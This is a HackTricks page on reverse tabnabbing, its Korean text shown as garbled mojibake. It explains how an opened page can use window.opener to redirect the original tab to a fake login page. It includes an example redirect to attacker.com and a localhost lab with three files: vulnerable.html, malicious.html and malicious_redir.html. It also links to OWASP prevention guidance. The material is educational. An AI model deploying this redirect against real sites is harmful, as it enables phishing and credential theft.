{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# ì„¤ëª…

**ê³µê²©ì**ê°€ **í”¼í•´ì**ê°€ í´ë¦­í•  **`<a`** íƒœê·¸ì˜ **`href`** ì¸ìë¥¼ **ì œì–´**í•  ìˆ˜ ìˆëŠ” ìƒí™©ì—ì„œ, **ê³µê²©ì**ëŠ” ì´ **ë§í¬**ë¥¼ ìì‹ ì˜ ì œì–´ í•˜ì— ìˆëŠ” ì›¹( **ì•…ì„±** **ì›¹ì‚¬ì´íŠ¸**)ìœ¼ë¡œ **ì§€ì •**í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, **í”¼í•´ìê°€ ë§í¬ë¥¼ í´ë¦­**í•˜ê³  ê³µê²©ìì˜ ì›¹ì‚¬ì´íŠ¸ì— ì ‘ê·¼í•˜ë©´, ì´ **ì•…ì„±** **ì›¹ì‚¬ì´íŠ¸**ëŠ” **ìë°”ìŠ¤í¬ë¦½íŠ¸** ê°ì²´ **`window.opener`**ë¥¼ í†µí•´ **ì›ë˜** **í˜ì´ì§€**ë¥¼ **ì œì–´**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í˜ì´ì§€ì— **`rel="opener"`**ê°€ ì—†ì§€ë§Œ **`target="_blank"`**ê°€ í¬í•¨ë˜ì–´ ìˆê³  **`rel="noopener"`**ê°€ ì—†ìœ¼ë©´, ë˜í•œ ì·¨ì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ í–‰ë™ì„ ì•…ìš©í•˜ëŠ” ì¼ë°˜ì ì¸ ë°©ë²•ì€ `window.opener.location = https://attacker.com/victim.html`ì„ í†µí•´ **ì›ë˜ ì›¹ì˜ ìœ„ì¹˜**ë¥¼ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì›¹ìœ¼ë¡œ **ë³€ê²½**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ì›¹ì€ **ì›ë˜ ì›¹ì‚¬ì´íŠ¸**ì²˜ëŸ¼ ë³´ì´ë„ë¡ **êµ¬ì„±**ë˜ì–´, **ë¡œê·¸ì¸** **í¼**ì„ **ëª¨ë°©**í•˜ê³  ì‚¬ìš©ìì—ê²Œ ìê²© ì¦ëª…ì„ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ **ê³µê²©ìê°€ ì´ì œ ì›ë˜ ì›¹ì‚¬ì´íŠ¸ì˜ ìœˆë„ìš° ê°ì²´ë¥¼ ì œì–´í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ**, ê·¸ëŠ” ì´ë¥¼ ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ ì•…ìš©í•˜ì—¬ **ì€ë°€í•œ ê³µê²©**ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì•„ë§ˆë„ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì´ë²¤íŠ¸ë¥¼ ìˆ˜ì •í•˜ì—¬ ê·¸ê°€ ì œì–´í•˜ëŠ” ì„œë²„ë¡œ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆê² ì£ ?).

# ê°œìš”

## ë°± ë§í¬ê°€ ìˆëŠ” ê²½ìš°

ì˜ˆë°© ì†ì„±ì´ ì‚¬ìš©ë˜ì§€ ì•Šì„ ë•Œ ë¶€ëª¨ í˜ì´ì§€ì™€ ìì‹ í˜ì´ì§€ ê°„ì˜ ë§í¬:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## ë°± ë§í¬ê°€ ì—†ëŠ” ê²½ìš°

ì˜ˆë°© ì†ì„±ì´ ì‚¬ìš©ë  ë•Œ ë¶€ëª¨ í˜ì´ì§€ì™€ ìì‹ í˜ì´ì§€ ê°„ì˜ ë§í¬:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## ì˜ˆì‹œ <a href="#examples" id="examples"></a>

ë‹¤ìŒ í˜ì´ì§€ë¥¼ í´ë”ì— ìƒì„±í•˜ê³  `python3 -m http.server`ë¡œ ì›¹ ì„œë²„ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.\
ê·¸ëŸ° ë‹¤ìŒ, **ì ‘ê·¼** `http://127.0.0.1:8000/`vulnerable.html, **í´ë¦­**í•˜ì—¬ **ì›ë˜** **ì›¹ì‚¬ì´íŠ¸** **URL**ì´ **ë³€ê²½**ë˜ëŠ” ê²ƒì„ í™•ì¸í•©ë‹ˆë‹¤.

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## ì ‘ê·¼ ê°€ëŠ¥í•œ ì†ì„± <a href="#accessible-properties" id="accessible-properties"></a>

**êµì°¨ ì¶œì²˜** ì ‘ê·¼ì´ ë°œìƒí•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ”, **opener** JavaScript ê°ì²´ ì°¸ì¡°ë¡œ ì§€ì¹­ë˜ëŠ” **window** JavaScript í´ë˜ìŠ¤ ì¸ìŠ¤í„´ìŠ¤ì˜ ì†ì„±ì— ëŒ€í•´ ì•…ì˜ì ì¸ ì‚¬ì´íŠ¸ê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê²ƒì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- **`opener.closed`**: ì´ ì†ì„±ì€ ì°½ì´ ë‹«í˜”ëŠ”ì§€ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ ì ‘ê·¼ë˜ë©°, ë¶ˆë¦¬ì–¸ ê°’ì„ ë°˜í™˜í•©ë‹ˆë‹¤.
- **`opener.frames`**: ì´ ì†ì„±ì€ í˜„ì¬ ì°½ ë‚´ì˜ ëª¨ë“  iframe ìš”ì†Œì— ëŒ€í•œ ì ‘ê·¼ì„ ì œê³µí•©ë‹ˆë‹¤.
- **`opener.length`**: í˜„ì¬ ì°½ì— ì¡´ì¬í•˜ëŠ” iframe ìš”ì†Œì˜ ìˆ˜ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.
- **`opener.opener`**: í˜„ì¬ ì°½ì„ ì—° ì°½ì— ëŒ€í•œ ì°¸ì¡°ë¥¼ ì´ ì†ì„±ì„ í†µí•´ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **`opener.parent`**: ì´ ì†ì„±ì€ í˜„ì¬ ì°½ì˜ ë¶€ëª¨ ì°½ì„ ë°˜í™˜í•©ë‹ˆë‹¤.
- **`opener.self`**: ì´ ì†ì„±ì€ í˜„ì¬ ì°½ ìì²´ì— ëŒ€í•œ ì ‘ê·¼ì„ ì œê³µí•©ë‹ˆë‹¤.
- **`opener.top`**: ì´ ì†ì„±ì€ ê°€ì¥ ìƒìœ„ì˜ ë¸Œë¼ìš°ì € ì°½ì„ ë°˜í™˜í•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ë„ë©”ì¸ì´ ë™ì¼í•œ ê²½ìš°, ì•…ì˜ì ì¸ ì‚¬ì´íŠ¸ëŠ” [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) JavaScript ê°ì²´ ì°¸ì¡°ì— ì˜í•´ ë…¸ì¶œëœ ëª¨ë“  ì†ì„±ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

# ì˜ˆë°©

ì˜ˆë°© ì •ë³´ëŠ” [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing)ì— ë¬¸ì„œí™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

## ì°¸ê³  ë¬¸í—Œ

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
